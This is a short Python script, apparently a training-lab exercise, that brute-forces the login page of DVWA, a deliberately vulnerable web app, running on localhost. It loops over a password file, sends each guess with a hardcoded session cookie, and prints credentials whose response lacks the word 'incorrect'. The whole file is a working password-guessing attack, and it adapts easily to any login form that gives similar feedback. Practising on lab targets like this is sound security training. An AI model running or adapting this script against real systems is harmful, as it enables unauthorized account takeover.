import requests

file = '/home/dojo/Desktop/passwords.txt'
name_list = ['admin']
headers = {'Cookie': 'security=low; PHPSESSID=4a6ru1dsdrsjlojeb9ssjaccll', 'Referer': 'http://localhost/DVWA/index.php'}


def get_http(u_name, p_word):
    url = "http://localhost/dvwa/vulnerabilities/brute/?username=" + u_name + "&password=" + p_word + "&Login=Login#"
    req = requests.get(url, headers=headers)
    return (url, req.status_code, req.text)


for list in name_list:
    name = list
    f = open(file, 'r')
    for line in f:
        p_word = line.strip()
        url, status_code, result = get_http(name, p_word)
        if result.find('incorrect') == -1:
            print('login: ' + name + ', password: ' + p_word)
    f.close()
